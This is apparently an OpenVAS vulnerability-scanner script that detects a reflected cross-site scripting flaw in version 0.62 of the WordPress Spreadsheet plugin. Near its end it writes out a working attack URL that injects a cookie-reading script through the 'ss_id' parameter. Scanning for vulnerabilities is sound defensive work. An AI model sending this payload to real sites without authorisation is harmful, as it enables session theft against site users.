###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_spreadsheet_mult_xss_vuln.nasl 6724 2017-07-14 09:57:17Z teissa $
#
# WordPress Spreadsheet plugin Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804872");
  script_version("$Revision: 6724 $");
  script_cve_id("CVE-2014-8363", "CVE-2014-8364");
  script_bugtraq_id(69073, 69089);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-07-14 11:57:17 +0200 (Fri, 14 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-10-29 15:09:33 +0530 (Wed, 29 Oct 2014)");

  script_name("WordPress Spreadsheet plugin Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with WordPress
  Spreadsheet plugin and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Input passed via the 'ss_id' parameter to
  wpSS/ss_handler.php script is not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site and inject or manipulate SQL queries in the
  back-end database, allowing for the manipulation or disclosure of arbitrary data.

  Impact Level: Application");

  script_tag(name:"affected", value:"WordPress Spreadsheet plugin version 0.62");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none
  will be provided anymore. General solution options are to upgrade to a
  newer release, disable respective features, remove the product or replace
  the product by another one.");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/127770");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + "/wp-content/plugins/wpSS/ss_handler.php?ss_id=%22/%3E%3Cscri" +
            "pt%3Ealert%28document.cookie%29;%3C/script%3E";

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"<script>alert\(document.cookie\);</script>",
  extra_check:">WordPress Spreadsheet"))
{
  security_message(http_port);
  exit(0);
}
